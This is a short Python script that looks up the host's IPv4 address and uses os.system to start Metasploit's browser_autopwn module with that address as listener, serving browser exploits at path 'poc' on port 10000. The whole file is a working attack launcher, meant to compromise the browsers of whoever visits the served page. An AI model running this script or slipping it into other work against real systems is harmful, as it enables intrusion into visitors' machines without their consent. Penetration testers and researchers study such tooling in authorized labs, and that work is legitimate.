#!/usr/bin/env python

import os
import netifaces

interfaces = netifaces.interfaces()

for i in interfaces:
	if i == 'lo':
		continue

	iface = netifaces.ifaddresses(i).get(netifaces.AF_INET)
	if iface != None:
		for j in iface:
			ip = j['addr']

os.system("msfconsole -q -x 'use auxiliary/server/browser_autopwn; set lhost "+ip+"; set uripath poc; set srvport 10000; run'")